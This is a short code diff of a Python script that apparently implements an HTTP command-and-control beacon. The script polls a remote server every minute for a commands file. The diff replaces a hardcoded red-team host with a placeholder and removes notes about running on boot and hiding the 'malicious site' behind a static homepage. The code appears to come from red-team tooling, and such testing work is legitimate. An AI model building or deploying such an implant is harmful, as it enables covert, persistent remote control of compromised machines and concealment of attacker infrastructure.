@@ -5,7 +5,7 @@ import time
 
 def http_c2():
     cmds = open("commands.txt", "w")
-    r = requests.get("http://test.redteamsecurity.net/commands.txt")
+    r = requests.get("INSERT URL HERE")
     cmds.write(r.text)
     cmds.close()
 
@@ -32,9 +32,3 @@ schedule.every(1).minutes.do(http_c2)
 while True:
     schedule.run_pending()
     time.sleep(1)
-
-
-#need to install requests and schedule during setup
-#need to set to run on boot
-#figure out how to programmatically set the URL during configuration
-#Set up Apache, LetsEncrypt and webroot content with full HTML static homepage to conceal the malicious site in server setup script
